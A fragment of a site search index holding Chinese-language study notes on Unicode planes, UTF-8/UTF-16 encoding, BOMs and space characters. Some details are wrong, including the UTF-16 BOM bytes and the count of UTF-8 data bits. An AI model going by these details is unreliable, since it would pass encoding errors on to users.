) b = re . compile ( r \"\\d+\\.\\d*\" ) a b \u7b49\u4ef7","title":"\u6807\u8bc6\u7b26"},{"location":"cs/unicode/","text":"Unicode \u7edf\u4e00\u7801 \u00b6 Unicode\uff08\u522b\u540d Universal coded character set (UCS)\uff09\uff0c\u5b98\u65b9\u4e2d\u6587\u540d\u79f0\u4e3a\u7edf\u4e00\u7801\uff0c\u662f\u8ba1\u7b97\u673a\u79d1\u5b66\u9886\u57df\u7684\u4e1a\u754c\u6807\u51c6\u3002\u5b83\u6574\u7406\u3001\u7f16\u7801\u4e86\u4e16\u754c\u4e0a\u5927\u90e8\u5206\u7684\u6587\u5b57\u7cfb\u7edf\uff0c\u4f7f\u5f97\u7535\u8111\u53ef\u4ee5\u7528\u66f4\u4e3a\u7b80\u5355\u7684\u65b9\u5f0f\u6765\u5448\u73b0\u548c\u5904\u7406\u6587\u5b57\u3002 Unicode \u4f34\u968f\u7740\u901a\u7528\u5b57\u7b26\u96c6\u7684\u6807\u51c6\u800c\u53d1\u5c55\uff0c\u540c\u65f6\u4e5f\u4ee5\u4e66\u672c\u7684\u5f62\u5f0f\u5bf9\u5916\u53d1\u8868\u3002Unicode \u81f3\u4eca\u4ecd\u5728\u4e0d\u65ad\u589e\u4fee\uff0c\u6bcf\u4e2a\u65b0\u7248\u672c\u90fd\u52a0\u5165\u66f4\u591a\u65b0\u7684\u5b57\u7b26\u3002\u76ee\u524d\u6700\u65b0\u7684\u7248\u672c\u4e3a 2021 \u5e74 9 \u6708\u516c\u5e03\u7684 14.0.0\uff0c\u5df2\u7ecf\u6536\u5f55\u8d85\u8fc714\u4e07\u4e2a\u5b57\u7b26\uff08\u7b2c\u5341\u4e07\u4e2a\u5b57\u7b26\u5728 2005 \u5e74\u83b7\u91c7\u7eb3\uff09\u3002Unicode \u9664\u4e86\u89c6\u89c9\u4e0a\u7684\u5b57\u5f62\u3001\u7f16\u7801\u65b9\u6cd5\u3001\u6807\u51c6\u7684\u5b57\u7b26\u7f16\u7801\u8d44\u6599\u5916\uff0c\u8fd8\u5305\u542b\u4e86\u5b57\u7b26\u7279\u6027\uff08\u5982\u5927\u5c0f\u5199\u5b57\u6bcd\uff09\u3001\u4e66\u5199\u65b9\u5411\u3001\u62c6\u5206\u6807\u51c6\u7b49\u7279\u6027\u7684\u8d44\u6599\u5e93\u3002 \u2014\u2014\u2014\u2014 \u7ef4\u57fa\u767e\u79d1 Abstract \u4e00\u76f4\u89c9\u5f97 Unicode \u548c UTF-8 \u7f16\u7801\u5f88\u6709\u610f\u601d\uff0c\u5c31\u770b\u4e86\u770b Unicode \u5b98\u7f51 Unicode \u5b57\u7b26\u767e\u79d1\uff08\u4e2d\u6587\uff09 Unicode \u6807\u51c6\uff1aISO/IEC 10646:2020 ISO/IEC 10646:2020 \u5b98\u65b9\u5f00\u653e\u4e0b\u8f7d\u5730\u5740 Unicode \u5b57\u7b26\u96c6 \u00b6 Unicode \u7684\u5b57\u7b26\u96c6\u4ee5\u5206\u7ec4\u7684\u5f62\u5f0f\u8fdb\u884c\u7f16\u6392\uff0c\u6574\u4f53\u5206\u4e3a 17 \u4e2a\u5e73\u9762\uff08Plane\uff09 \u6bcf\u4e2a\u5e73\u9762\u4e2d\u6709 \\(2^{16}\\) \u4e2a\u7801\u4f4d\uff08codepoint\uff09\uff0c\u5373\u53ef\u4ee5\u5305\u542b 65536 \u4e2a\u5b57\u7b26\uff0c\u6574\u4f53\u6700\u591a\u53ef\u4ee5\u5305\u542b 111w+ \u4e2a\u5b57\u7b26\uff0c\u4f46\u76ee\u524d\u53ea\u4f7f\u7528\u4e86\u5c11\u6570\u5e73\u9762\u5171 14w+ \u4e2a\u5b57\u7b26 Unicode \u5b57\u7b26\u96c6\u4e2d\u6bcf\u4e2a\u5b57\u7b26\u90fd\u6709\u4e00\u4e2a\u7f16\u53f7\uff0c\u5373\u5b57\u7b26\u503c\u3002\u5316\u4e3a\u5341\u516d\u8fdb\u5236\u540e\u540e\u56db\u4f4d\u4e3a\u5728\u5f53\u524d\u5e73\u9762\u4e0a\u7684\u7801\u503c\uff0c\u524d\u9762\u5269\u4f59\u7684\u4e3a\u5e73\u9762\u7f16\u53f7 \u6bd4\u5982 \"\u9e64\" \u8fd9\u4e2a\u5b57\u7b26\u7684\u5b57\u7b26\u503c\u662f 0x9E64\uff0c\u8868\u793a\u4e3a U+9E64 \u5b57\u7b26\u5e73\u9762\u6620\u5c04 \u00b6 \u5e73\u9762\u7f16\u53f7 \u5b57\u7b26\u503c\u8303\u56f4 \u540d\u79f0 0 U+0000 ~ U+FFFF BMP \uff08Basic Multilingual Plane\uff09\u57fa\u672c\u591a\u6587\u79cd\u5e73\u9762 1 U+10000 ~ U+1FFFF SMP \uff08Supplementary Multilingual Plane\uff09\u591a\u6587\u79cd\u8865\u5145\u5e73\u9762 2 U+20000 ~ U+2FFFF SIP \uff08Supplementary Ideographic Plane\uff09\u8868\u610f\u6587\u5b57\u8865\u5145\u5e73\u9762 3 U+30000 ~ U+3FFFF TIP \uff08Tertiary Ideographic Plane\uff09\u8868\u610f\u6587\u5b57\u7b2c\u4e09\u5e73\u9762 4~13 U+40000 ~ U+DFFFF Reserved Planes \u5c1a\u672a\u4f7f\u7528 14 U+E0000 ~ U+EFFFF SSP \uff08Supplementary Special-purpose Plane\uff09\u7279\u522b\u7528\u9014\u8865\u5145\u5e73\u9762 15 U+F0000 ~ U+FFFFF PUA-A \uff08Private Use Area-A\uff09\u79c1\u4eba\u4f7f\u7528\u533a A \u533a 16 U+100000 ~ U+10FFFF PUA-B \uff08Private Use Area-B\uff09\u79c1\u4eba\u4f7f\u7528\u533a B \u533a BMP \u5e73\u9762\uff08\u57fa\u672c\u591a\u6587\u79cd\u5e73\u9762\uff09 \u8be6\u89c1\uff1a Unicode \u5b57\u7b26\u767e\u79d1 \u57fa\u672c\u591a\u6587\u79cd\u5e73\u9762 - \u7ef4\u57fa\u767e\u79d1 SMP \u5e73\u9762\uff08\u7b2c\u4e00\u8f85\u52a9\u5e73\u9762\uff09 \u4e3b\u8981\u6446\u653e\u7edd\u5927\u591a\u6570\u53e4\u4ee3\u6587\u5b57\uff0c\u73b0\u65f6\u5df2\u4e0d\u518d\u4f7f\u7528\u6216\u5f88\u5c11\u4f7f\u7528\u6587\u5b57\u3001\u901f\u8bb0\u3001\u6570\u5b66\u5b57\u6bcd\u7b26\u53f7\u3001\u97f3\u7b26\u3001\u56fe\u5f62\u7b26\u53f7\u53ca\u7528\u4e8e\u5b66\u8005\u7684\u4e13\u4e1a\u8bba\u6587\u4e2d\u4f7f\u7528\u7684\u53e4\u8001\u6216\u8fc7\u65f6\u7684\u8bed\u8a00\u4e66\u5199\u7b26\u53f7\uff0c\u4ee5\u53ca emoji \u8be6\u89c1\uff1a Unicode \u5b57\u7b26\u767e\u79d1 \u7b2c\u4e00\u8f85\u52a9\u5e73\u9762 - \u7ef4\u57fa\u767e\u79d1 SIP \u5e73\u9762\uff08\u7b2c\u4e8c\u8f85\u52a9\u5e73\u9762\uff09 \u5168\u4e3a CJK \u5b57\u7b26\uff0c\u5305\u542b\u5c11\u7528\u7684\u6c49\u5b57\u4ee5\u53ca\u67d0\u4e9b\u65b9\u8a00\u6587\u5b57 U+20000 ~ U+2A6DF\uff1a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55B\u533a\uff08CJK Unified Ideographs Extension B\uff0943253 \u4e2a\u6c49\u5b57 U+2A700 ~ U+2B73F\uff1a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55C\u533a\uff08CJK Unified Ideographs Extension C\uff094149 \u4e2a\u6c49\u5b57 U+2B740 ~ U+2B81F\uff1a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55D\u533a\uff08CJK Unified Ideographs Extension D\uff09222 \u4e2a\u6c49\u5b57 U+2B820 ~ U+2CEAF\uff1a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55E\u533a\uff08CJK Unified Ideographs Extension E\uff095762 \u4e2a\u6c49\u5b57 U+2CEB0 ~ U+2EBEF\uff1a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55F\u533a\uff08CJK Unified Ideographs Extension F\uff097473 \u4e2a\u6c49\u5b57 U+2F800 ~ U+2FA1F\uff1a\u4e2d\u65e5\u97e9\u517c\u5bb9\u8868\u610f\u6587\u5b57\u589e\u8865\uff08CJK Compatibility Ideographs Supplement\uff09542 \u4e2a\u6c49\u5b57 TIP \u5e73\u9762\uff08\u7b2c\u4e09\u8f85\u52a9\u5e73\u9762\uff09 \u5df2\u5206\u914d U+30000 ~ U+3134F \u4e3a\u4e2d\u65e5\u97e9\u7edf\u4e00\u8868\u610f\u6587\u5b57\u6269\u5c55G\u533a\uff0c\u5305\u542b\u7532\u9aa8\u6587\u3001\u91d1\u6587\u3001\u5c0f\u7bc6\u3001\u4e2d\u56fd\u6218\u56fd\u65f6\u671f\u6587\u5b57\u7b49 SSP \u5e73\u9762\uff08\u7b2c\u5341\u56db\u8f85\u52a9\u5e73\u9762\uff09 \u5747\u4e3a\u63a7\u5236\u5b57\u7b26 U+E0000 ~ U+E007F\uff1a\u8bed\u8a00\u7f16\u7801\u6807\u7b7e\uff08Tags\uff09 U+E0100 ~ U+E01EF\uff1a\u5b57\u5f62\u53d8\u6362\u9009\u53d6\u5668\uff08Variation Selectors Supplement\uff09 \u79c1\u4eba\u4f7f\u7528\u533a Unicode \u4e2d\u4e00\u5171\u6709\u4e09\u4e2a\u79c1\u4eba\u4f7f\u7528\u533a\uff1a U+E000 ~ U+F8FF\uff1a\u57fa\u672c\u591a\u6587\u79cd\u5e73\u9762 \u79c1\u4eba\u4f7f\u7528\u533a U+F0000 ~ U+FFFFD\uff1a\u79c1\u4eba\u4f7f\u7528\u533a A \u533a U+100000 ~ U+10FFFD\uff1a\u79c1\u4eba\u4f7f\u7528\u533a B \u533a \u4e00\u822c\u7528\u4e8e\u67d0\u4e9b\u6807\u51c6\u6765\u89c4\u5b9a Unicode \u6807\u51c6\u4e4b\u5916\u7684\u5b57\u7b26\uff0c\u4f8b\u5982 GB/T 20542-2006\uff08\u201c\u85cf\u6587\u7f16\u7801\u5b57\u7b26\u96c6\u6269\u5c55A\u201d\uff09\u548c GB/T 22238-2008\uff08\u201c\u85cf\u6587\u7f16\u7801\u5b57\u7b26\u96c6\u6269\u5c55B\u201d\uff09\u4f7f\u7528\u79c1\u4eba\u4f7f\u7528\u533a\u5b58\u653e\u85cf\u6587\u8fde\u5b57 \u7f16\u7801 \u00b6 Unicode \u6709\u4e24\u79cd\u5b57\u7b26\u6620\u5c04\u65b9\u5f0f\uff0cUTF\uff08Unicode Transformation Format\uff09\u7f16\u7801\u548c UCS\uff08Universal Coded Character Set\uff09\u7f16\u7801\uff0c\u5177\u4f53\u6765\u8bf4\u6709 UCS-2\u3001UCS-4\u3001UTF-1\u3001UTF-8\u3001UTF-16\u3001UTF-32 \u7b49 UCS \u00b6 UCS-2 \uff0cUniversal Character Set coded in 2 octets\uff0c\u5373\u7528\u4e24\u4e2a\u5b57\u8282\u6765\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\uff0c\u8303\u56f4\u4ece U+0000 \u5230 U+FFFF\u3002\u4e5f\u5c31\u662f\u8bf4 UCS-2 \u53ea\u80fd\u8868\u793a BMP \u5e73\u9762\u4e0a\u7684\u5b57\u7b26 UCS-4 \uff0c\u540c\u7406\uff0c\u7528\u56db\u4e2a\u5b57\u8282\u6765\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\uff0c\u4ece U+00000000 \u5230 U+FFFFFFFF\uff0c\u53ef\u4ee5\u8868\u793a\u6240\u6709 Unicode \u5b57\u7b26\uff08UCS-4 \u4e0e UTF-32 \u5b8c\u5168\u7b49\u4ef7\uff09 \u4f46\u662f\u8fd9\u4e24\u79cd\u65b9\u6848\u90fd\u4f1a\u5bfc\u81f4\u7f16\u7801\u540e\u6709\u5927\u91cf\u7684 0x00 \u5b57\u8282\uff0c\u5360\u7a7a\u95f4\uff0c\u6240\u4ee5\u4e5f\u5c31\u6709\u4e86\u53ef\u53d8\u957f\u5ea6\u7684 UTF \u7f16\u7801 UTF-8 \u00b6 UTF-8 \u7f16\u7801\u662f\u76ee\u524d\u6700\u5e38\u7528\u7684\u7f16\u7801\u65b9\u5f0f\uff0c\u5b83\u662f\u4e00\u4e2a\u53ef\u53d8\u5bbd\u5ea6\u7684\u5b57\u7b26\u7f16\u7801\uff0c\u6bcf\u4e2a\u5b57\u7b26\u503c\u4f1a\u88ab\u7f16\u7801\u4e3a 1 \u5230 4 \u4e2a\u5b57\u8282 \u5177\u4f53\u6309\u7167\u4e0b\u9762\u7684\u7f16\u7801\u65b9\u5f0f\uff1a \u5b57\u7b26\u503c\u8303\u56f4 \u7b2c\u4e00\u5b57\u8282 \u7b2c\u4e8c\u5b57\u8282 \u7b2c\u4e09\u5b57\u8282 \u7b2c\u56db\u5b57\u8282 U+0000 ~ U+007F 0 xxxxxxx U+0080 ~ U+07FF 110 xxxxx 10 xxxxxx U+0800 ~ U+FFFF 1110 xxxx 10 xxxxxx 10 xxxxxx U+10000 ~ U+10FFFF 11110 xxx 10 xxxxxx 10 xxxxxx 10 xxxxxxx \u53ef\u4ee5\u53d1\u73b0\u6bcf\u4e2a\u5b57\u8282\u90fd\u662f\u7531\u5f00\u5934\u7684\u51e0\u4e2a\u6bd4\u7279\u524d\u7f00\u548c\u5269\u4f59\u7684\u6570\u636e\u90e8\u5206\u7ec4\u6210\u7684 0\uff1a\u5f53\u524d\u8fd9\u4e00\u4e2a\u5b57\u8282\u5c31\u8868\u793a\u4e00\u4e2a\u5b57\u7b26\u503c 110\uff1a\u5f53\u524d\u5b57\u7b26\u503c\u9700\u8981\u4e24\u4e2a\u5b57\u8282\uff08\u540e\u7eed\u4e00\u4e2a\u5b57\u8282\u4e5f\u5c5e\u4e8e\u8fd9\u4e2a\u5b57\u7b26\u503c\uff09 1110\uff1a\u5f53\u524d\u5b57\u7b26\u503c\u9700\u8981\u4e09\u4e2a\u5b57\u8282\uff08\u540e\u7eed\u4e24\u4e2a\u5b57\u8282\u4e5f\u5c5e\u4e8e\u8fd9\u4e2a\u5b57\u7b26\u503c\uff09 11110\uff1a\u5f53\u524d\u5b57\u7b26\u503c\u9700\u8981\u56db\u4e2a\u5b57\u8282\uff08\u540e\u7eed\u4e09\u4e2a\u5b57\u8282\u4e5f\u5c5e\u4e8e\u8fd9\u4e2a\u5b57\u7b26\u503c\uff09 10\uff1a\u5f53\u524d\u5b57\u8282\u662f\u4e00\u4e2a\u5b57\u7b26\u503c\u7684\u4e00\u90e8\u5206 \u4e5f\u53ef\u4ee5\u53d1\u73b0\uff0c\u56db\u4e2a\u5b57\u8282\u65f6\u5269\u4f59\u7684\u6570\u636e\u6bd4\u7279\u4e3a 12 \u4e2a\uff0c\u6b63\u597d\u662f Unicode \u89c4\u5b9a\u7684\u6700\u5927\u5bb9\u91cf \u4e5f\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e9b\u7279\u70b9\uff1a U+0000 ~ U+007F \u8fd9 128 \u4e2a\u5b57\u7b26\u503c\u5168\u90e8\u90fd\u662f\u4f7f\u7528\u4e00\u4e2a\u5b57\u8282\u6765\u8868\u793a\uff0c\u5e76\u4e14\u524d\u7f00\u4e3a 0\uff0c\u5373\u7f16\u7801\u540e\u7684\u5b57\u8282\u503c\u548c\u5b57\u7b26\u503c\u76f8\u540c\u3002\u800c\u4e14\u8fd9 128 \u4e2a\u5b57\u7b26\u6b63\u597d\u662f ASCII \u7f16\u7801\u4e2d\u89c4\u5b9a\u7684\u5b57\u7b26\uff0c\u4f7f\u5f97 UTF-8 \u7f16\u7801\u5b8c\u5168\u517c\u5bb9 ASCII \u7f16\u7801 \u5728 BMP \u5e73\u9762\u4e2d\u7684 CJK \u5b57\u7b26\u90fd\u4f1a\u7f16\u7801\u4e3a 3 \u4e2a\u5b57\u8282 BMP \u5e73\u9762\u4f1a\u7f16\u7801\u4e3a 1~3 \u4e2a\u5b57\u8282\uff0c\u800c\u5269\u4f59\u7684\u5176\u4ed6\u5e73\u9762\u5747\u4f1a\u7f16\u7801\u4e3a 4 \u4e2a\u5b57\u8282 UTF-8 with BOM \u00b6 BOM\uff08Byte Order Mark\uff09\u5b57\u8282\u5e8f\u6807\u8bb0\u5728 UTF-8 \u7f16\u7801\u4e2d\u662f\u6ca1\u6709\u7528\u5904\u7684\uff0c\u4e5f\u4e0d\u63a8\u8350\uff0c\u5982\u679c\u5728\u6587\u4ef6\u5934\u5b58\u5728\u5219\u76f4\u63a5\u5ffd\u7565 UTF-8 \u7684 BOM \u548c UTF-16 \u7684 BOM \u5b57\u7b26\u503c\u4e00\u6837\u4e3a U+FEFF\uff0c\u7f16\u7801\u4e3a UTF-8 \u5373\u4e3a 0xEF 0xBB 0xBF \u4e09\u4e2a\u5b57\u8282\u3002\u5982\u679c\u8fd9\u4e09\u4e2a\u5b57\u8282\u5b58\u5728\u4e8e\u6587\u4ef6\u5934\uff0c\u5219\u8868\u660e\u4e86\u8fd9\u4e2a\u6587\u4ef6\u4ee5 UTF-8 \u7f16\u7801\uff0c\u5e76\u4e14\u8fd9\u4e09\u4e2a\u5b57\u7b26\u5e94\u8be5\u76f4\u63a5\u5ffd\u7565 UTF-16 \u00b6 UTF-16 \u4e5f\u662f\u53ef\u53d8\u5bbd\u5ea6\u7684\uff0c\u5b83\u5c06\u4e00\u4e2a\u5b57\u7b26\u503c\u7f16\u7801\u4e3a 1~2 \u4e2a 16 \u6bd4\u7279\u957f\u7684\u7801\u5143\uff08\u5373 2 \u6216 4 \u4e2a\u5b57\u8282\uff09 \u5b83\u7684\u7f16\u7801\u65b9\u5f0f\u5206\u4e3a\u4e24\u7c7b\uff1a U+0000 ~ U+FFFF \u8303\u56f4 BMP \u7684\u5168\u90e8\u90e8\u5206\uff0c\u7f16\u7801\u503c\u548c\u7801\u4f4d\u76f8\u540c\uff0c\u5373\u76f4\u63a5\u5c06\u7801\u4f4d\u4f5c\u4e3a\u4e24\u4e2a\u5b57\u8282\u7684\u7f16\u7801 U+10000 ~ U+10FFFF \u8303\u56f4 \u6240\u6709\u7684\u8f85\u52a9\u5e73\u9762\u4e0a\u7684\u7801\u4f4d\u4f1a\u88ab\u7f16\u7801\u4e3a\u4e00\u5bf9 16 \u6bd4\u7279\u957f\u7684\u7801\u5143\uff0c\u79f0\u4e3a\u4ee3\u7406\u5bf9\uff08Surrogate Pair\uff09 \u7801\u4f4d\u51cf 0x10000\uff0c\u4f7f\u8303\u56f4\u843d\u5728 0x00000 \u5230 0xFFFFF\uff0c\u5373 20 \u6bd4\u7279 \u9ad8\u4f4d\u7684 10 \u6bd4\u7279\u7684\u503c\u52a0\u4e0a 0xD800 \u5f97\u5230\u7b2c\u4e00\u4e2a\u7801\u5143\uff0c\u4e5f\u79f0\u9ad8\u4f4d\u4ee3\u7406\uff08high surrogate\uff09\u6216\u524d\u5bfc\u4ee3\u7406\uff08lead surrogate\uff09 \u4f4e\u4f4d\u7684 10 \u6bd4\u7279\u7684\u503c\u52a0\u4e0a 0xDC00 \u5f97\u5230\u7b2c\u4e8c\u4e2a\u7801\u5143\uff0c\u4e5f\u79f0\u4f4e\u4f4d\u4ee3\u7406\uff08low surrogate\uff09\u6216\u540e\u5c3e\u4ee3\u7406\uff08trail surrogate\uff09 \u8fd9\u6837\u7f16\u7801\u4e4b\u540e\u9ad8\u4f4d\u4ee3\u7406\u7684\u8303\u56f4\u662f 0xD800 ~ 0xDBFF\uff0c\u4f4e\u4f4d\u4ee3\u7406\u7684\u8303\u56f4\u662f 0xDC00 ~ 0xDFFF \u800c U+D800 ~ U+DFFF \u8fd9\u4e9b\u7801\u4f4d\u5728 BMP \u4e2d\u5df2\u7ecf\u9884\u7559\u4e86\u51fa\u6765\u4e0d\u8868\u793a\u4efb\u4f55\u5b57\u7b26\uff0c\u56e0\u6b64\u8fd9\u4e09\u4e2a\u90e8\u5206\u662f\u4e0d\u4f1a\u91cd\u53e0\u7684\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bc6\u522b\u51fa\u6765\u662f\u600e\u4e48\u7f16\u7801\u7684 UTF-16 \u4e0e UTF-8 \u76f8\u6bd4\uff0c\u597d\u5904\u662f\u5927\u90e8\u5206\u5b57\u7b26\u90fd\u53ef\u4ee5\u7f16\u7801\u4e3a\u56fa\u5b9a\u7684\u4e24\u4e2a\u5b57\u8282\uff0c\u800c\u574f\u5904\u4e5f\u5f88\u660e\u663e\uff0c\u5b83\u4e0e ASCII \u5b8c\u5168\u4e0d\u517c\u5bb9 UTF-16 \u7f16\u7801\u6a21\u5f0f \u00b6 UTF-16 \u53ef\u4ee5\u4f7f\u7528\u5927\u7aef\u5e8f\u548c\u5c0f\u7aef\u5e8f\uff0c\u5728\u6587\u4ef6\u5f00\u5934\u4f1a\u6709 BOM\uff08U+FEFF\uff09\u6765\u6307\u660e\u5230\u5e95\u662f\u54ea\u4e2a\u6a21\u5f0f\uff08\u5982\u679c\u6ca1\u6709\uff0c\u5219\u9700\u8981\u731c\u6d4b\uff09 \u5c0f\u7aef\u5e8f\uff08UTF-16 LE\uff09\u4e0b BOM \u8868\u73b0\u4e3a 0xFF 0xEF \u5927\u7aef\u5e8f\uff08UTF-16 BE\uff09\u4e0b BOM \u8868\u73b0\u4e3a 0xEF 0xFF \u90e8\u5206\u7279\u6b8a\u5b57\u7b26 \u00b6 \u7a7a\u683c \u00b6 Unicode \u4e2d\u7684\u7a7a\u683c\u4e5f\u6709\u5f88\u591a\u79cd\uff0c\u5b83\u4eec\u6709\u4e0d\u540c\u7684\u5bbd\u5ea6\u3001\u4ee5\u53ca\u610f\u4e49\uff08\u4e00\u4e9b\u96f6\u5bbd\u5b57\u7b26\u4e5f\u63a5\u5728\u8868\u540e\u9762\u4e86\uff09 [data-md-color-scheme=\"default\"] .space { white-space: pre; padding: 0; background-color: #000000DE; display: inline-block; line-height: 1; } [data-md-color-scheme=\"slate\"] .space { white-space: pre; padding: 0; background-color: #FFFFFFE6; display: inline-block; line-height: 1; } \u7801\u4f4d \u540d\u79f0 \u5bbd\u5ea6 \u610f\u4e49/\u7528\u9014 U+0020 SPACE ASCII \u7a7a\u683c\uff0c\u76f4\u63a5\u6253\u7a7a\u683c\u5c31\u662f\u8fd9\u4e2a U+00A0 NO-BREAK SPACE \u548c U+0020 \u7c7b\u4f3c\uff0c\u4f46\u662f\u4e0d\u4f1a\u65ad\u884c\uff0cHTML \u5b9e\u4f53 &nbsp; U+1680 OGHAM SPACE MARK \u1680 \u6b27\u7518\u6587\u7a7a\u683c U+2000 EN QUAD \u2002 \u534a\u5bbd\u7a7a\u767d\uff0c\u4e00\u822c\u4f7f\u7528 U+2002 \u66ff\u4ee3 U+2001 EM QUAD \u2003 \u5168\u5bbd\u7a7a\u767d\uff0c\u4e00\u822c\u4f7f\u7528 U+2003 \u66ff\u4ee3 U+2002 EN SPACE \u2002 \u534a\u5bbd\u7a7a\u683c\uff0cHTML \u5b9e\u4f53 &ensp; U+2003 EM SPACE \u2003 \u5168\u5bbd\u7a7a\u683c\uff0cHTML \u5b9e\u4f53 &emsp; U+2004 THREE-PER-EM SPACE \u2004 \u4e09\u5206\u5bbd\u7a7a\u683c\uff0c\u5bbd\u5ea6\u662f\u5b57\u4f53\u9ad8\u5ea6\u7684 1/3\uff0c &emsp13; U+2005 FOUR-PER-EM SPACE \u2005 \u56db\u5206\u5bbd\u7a7a\u683c\uff0c\u5bbd\u5ea6\u662f\u5b57\u4f53\u9ad8\u5ea6\u7684 1/4\uff0c &emsp14; U+2006 SIX-PER-EM SPACE \u2006 \u516d\u5206\u5bbd\u7a7a\u683c\uff0c\u5bbd\u5ea6\u662f\u5b57\u4f53\u9ad8\u5ea6\u7684 1/6 U+2007 FIGURE SPACE \u2007 \u6570\u5b57\u7a7a\u683c\uff0c\u5728\u6709\u7b49\u5bbd\u6570\u5b57\u7684\u5b57\u4f53\u4e2d\u5bbd\u5ea6\u548c\u4e00\u4e2a\u6570\u5b57\u5bbd\u5ea6\u4e00\u81f4\uff0c &numsp; U+2008 PUNCTUATION SPACE \u2008 \u7b26\u53f7\u7a7a\u683c\uff0c\u4e0e\u7a84\u6807\u70b9\u7b26\u53f7\u5bbd\u5ea6\u4e00\u81f4\uff0c &puncsp; U+2009 THIN SPACE \u2009 \u8584\u7a7a\u683c\uff0c\u5bbd\u5ea6\u4e0d\u56fa\u5b9a\uff0c &thinsp; U+200A HAIR SPACE \u200a \u5934\u53d1\u7a7a\u683c\uff0c\u6bd4\u8584\u7a7a\u683c\u66f4\u7a84\uff0c &hairsp; U+202F NARROW NO-BREAK SPACE \u202f \u7a84\u7684\u4e0d\u95f4\u65ad\u7a7a\u683c\uff0c\u5728\u8499\u53e4\u8bed\u4e2d\u5bbd\u5ea6\u7c7b\u4f3c\u4e09\u5206\u5bbd\uff0c\u5176\u4ed6\u7c7b\u4f3c U+2009 U+205F MEDIUM MATHEMATICAL SPACE \u205f \u4e2d\u7b49\u6570\u5b66\u7a7a\u683c\uff0c4/18\u5bbd\uff0c\u7528\u4e8e\u6570\u5b66\u516c\u5f0f\u4e2d\u7b26\u53f7\u4e24\u4fa7\uff0c &MediumSpace; U+3000 IDEOGRAPHIC SPACE \u3000 \u8868\u610f\u7a7a\u683c\uff0cCJK \u8868\u610f\u6587\u5b57\u4f7f\u7528\u7684\u5168\u89d2\u7a7a\u683c U+200B ZERO WIDTH SPACE \u96f6\u5bbd\u7a7a\u683c\uff0c &ZeroWidthSpace; U+200C ZERO WIDTH NON-JOINER \u96f6\u5bbd\u4e0d\u8fde\u5b57\uff0c\u7528\u6765\u963b\u6b62\u5e26\u8fde\u5b57\u5b57\u4f53\u7684\u8fde\u5b57\uff0c &zwnj; U+200D ZERO WIDTH JOINER \u96f6\u5bbd\u8fde\u5b57\uff0c\u53ef\u4ee5\u8bf1\u5bfc\uff08\u5982\u8868\u60c5\u7b26\u53f7\u548c\u50e7\u4f3d\u7f57\u8bed\uff09\u6216\u6291\u5236\uff08\u5982\u68b5\u6587\uff09\u7528\u5355\u4e2a\u5b57\u5f62\u66ff\u6362\uff0c &zwj; U+2060 WORD JOINER \u96f6\u5bbd\u8bcd\u8fde\u63a5\u7b26\uff0c\u4e0d\u4f1a\u5728\u8bcd\u95f4\u65ad\u884c\uff0c &NoBreak; U+FEFF ZERO WIDTH NO-BREAK SPACE \u96f6\u5bbd\u4e0d\u95f4\u65ad\u7a7a\u683c\uff0c\u73b0\u7528\u4f5c\u6807\u8bb0\u5927\u5c0f\u7aef\u5e8f \u6a2a\u7ebf \u00b6 \u8be6\u89c1 \u4e0d\u79bb\u4e0d\u5f03\u7684\u7834\u6298\u53f7 - The Type","title":"Unicode"},{"location":"cs/unicode/#unicode","text":"Unicode\uff08\u522b\u540d Universal coded character set (UCS)\uff09\uff0c\u5b98\u65b9\u4e2d\u6587\u540d\u79f0\u4e3a\u7edf\u4e00\u7801\uff0c\u662f\u8ba1\u7b97\u673a\u79d1\u5b66\u9886\u57df\u7684\u4e1a\u754c\u6807\u51c6\u3002\u5b83\u6574\u7406\u3001\u7f16\u7801\u4e86\u4e16\u754c\u4e0a\u5927\u90e8\u5206\u7684\u6587\u5b57\u7cfb\u7edf\uff0c\u4f7f\u5f97\u7535\u8111\u53ef\u4ee5\u7528\u66f4\u4e3a\u7b80\u5355\u7684\u65b9\u5f0f\u6765\u5448\u73b0\u548c\u5904\u7406\u6587\u5b57\u3002 Unicode \u4f34\u968f\u7740\u901a\u7528\u5b57\u7b26\u96c6\u7684\u6807\u51c6\u800c\u53d1\u5c55\uff0c\u540c\u65f6\u4e5f\u4ee5\u4e66\u672c\u7684\u5f62\u5f0f\u5bf9\u5916\u53d1\u8868\u3002Unicode \u81f3\u4eca\u4ecd\u5728\u4e0d\u65ad\u589e\u4fee\uff0c\u6bcf\u4e2a\u65b0\u7248\u672c\u90fd\u52a0\u5165\u66f4\u591a\u65b0\u7684\u5b57\u7b26\u3002\u76ee\u524d\u6700\u65b0\u7684\u7248\u672c\u4e3a 2021 \u5e74 9 \u6708\u516c\u5e03\u7684 14.0.0\uff0c\u5df2\u7ecf\u6536\u5f55\u8d85\u8fc714\u4e07\u4e2a\u5b57\u7b26\uff08\u7b2c\u5341\u4e07\u4e2a\u5b57\u7b26\u5728 2005 \u5e74\u83b7\u91c7\u7eb3\uff09\u3002Unicode \u9664\u4e86\u89c6\u89c9\u4e0a\u7684\u5b57\u5f62\u3001\u7f16\u7801\u65b9\u6cd5\u3001\u6807\u51c6\u7684\u5b57\u7b26\u7f16\u7801\u8d44\u6599\u5916\uff0c\u8fd8\u5305\u542b\u4e86\u5b57\u7b26\u7279\u6027\uff08\u5982\u5927\u5c0f\u5199\u5b57\u6bcd\uff09\u3001\u4e66\u5199\u65b9\u5411\u3001\u62c6\u5206\u6807\u51c6\u7b49\u7279\u6027\u7684\u8d44\u6599\u5e93\u3002 \u2014\u2014\u2014\u2014 \u7ef4\u57fa\u767e\u79d1 Abstract \u4e00\u76f4\u89c9\u5f97 Unicode \u548c UTF-8 \u7f16\u7801\u5f88\u6709\u610f\u601d\uff0c\u5c31\u770b\u4e86\u770b Unicode \u5b98\u7f51 Unicode \u5b57\u7b26\u767e\u79d1\uff08\u4e2d\u6587\uff09 Unicode \u6807\u51c6\uff1aISO/IEC 10646:2020 ISO/IEC 10646:2020 